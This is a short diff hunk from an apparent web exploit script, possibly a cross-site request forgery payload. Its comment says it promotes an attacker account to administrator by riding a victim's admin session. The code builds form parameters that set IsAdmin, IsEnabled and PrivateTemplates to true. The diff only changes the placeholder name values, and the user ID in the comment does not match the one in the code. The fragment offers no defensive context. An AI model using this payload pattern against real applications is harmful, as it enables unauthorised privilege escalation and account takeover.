@@ -9,8 +9,8 @@
   // Promote attacker (ID 61455) to admin using victim's admin session
   var b = new URLSearchParams();
   b.append('ID','61491');
-  b.append('FirstName','Test');
-  b.append('LastName','User');
+  b.append('FirstName','fdgfdsg');
+  b.append('LastName','sdfds');
   b.append('IsEnabled','true');
   b.append('IsAdmin','true');
   b.append('PrivateTemplates','true');
